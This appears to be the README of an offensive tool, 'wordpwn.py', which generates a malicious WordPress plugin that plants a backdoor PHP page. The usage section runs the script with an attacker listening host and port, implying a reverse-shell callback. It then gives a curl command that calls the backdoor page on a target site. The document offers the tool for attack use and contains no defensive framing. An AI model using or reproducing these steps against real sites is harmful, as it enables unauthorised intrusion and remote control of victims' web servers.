# malicious-wordpress-plugin
Simply generates a malicious wordpress plugin without msfvenom.

#### Usage Example
```sh
root@wetw0rk:~# python wordpwn.py 
__        __            _
\ \      / /__  _ __ __| |_ ____      ___ __
 \ \ /\ / / _ \|  __/ _  |  _ \ \ /\ / /  _ \ 
  \ V  V / (_) | | | (_| | |_) \ V  V /| | | |
   \_/\_/ \___/|_|  \__,_| .__/ \_/\_/ |_| |_|
                         |_|


Usage: wordpwn.py [LHOST] [LPORT]
Example: wordpwn.py 192.168.0.6 8888
```

Finally, visist the backdoor page `wetw0rk_maybe.php`.

```
curl http://[target]/wp-content/plugins/malicous/wetw0rk_maybe.php
```

